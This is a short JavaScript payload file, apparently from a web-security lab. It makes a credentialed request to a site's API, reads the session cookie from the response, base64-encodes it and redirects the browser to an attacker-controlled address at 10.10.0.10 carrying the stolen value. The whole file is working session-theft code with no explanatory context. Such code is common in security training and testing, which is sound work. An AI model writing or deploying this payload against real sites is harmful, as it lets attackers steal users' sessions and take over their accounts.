// cookies.js
var req = new XMLHttpRequest();
req.onload=reqListener;
var url="https://guitjapeo.thl/api/info";
req.withCredentials=true;
req.open("GET",url,false);
req.send();
function reqListener() {
    const sess=JSON.parse(this.responseText).cookie;
    location.href="http://10.10.0.10/?data="+btoa(sess);
};
